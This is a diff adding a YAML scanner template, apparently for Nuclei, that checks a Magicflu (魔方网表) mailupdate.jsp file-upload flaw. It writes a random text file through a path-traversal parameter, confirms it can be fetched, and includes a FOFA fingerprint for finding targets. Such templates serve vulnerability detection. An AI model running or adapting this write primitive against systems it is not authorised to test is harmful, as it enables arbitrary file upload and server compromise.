@@ -1,0 +1,39 @@
+id: poc-yaml-mofangwangbiao-mailupdate-jsp-file-upload
+info:
+  name: 魔方网表 mailupdate.jsp 文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件上传
+  metadata:
+    fofa: icon_hash="694014318"
+variables:
+  name: "{{rand_text_alpha(6)}}"
+  content: "{{rand_text_alpha(16)}}"
+flow: http(1) && http(2)
+http:
+  - id: upload-file
+    method: GET
+    path:
+      - "/magicflu/html/mail/mailupdate.jsp?messageid=/../../../{{name}}.txt&messagecontent={{content}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Content-Type: text/html"
+  - id: verify-file
+    method: GET
+    path:
+      - "/magicflu/{{name}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{content}}"
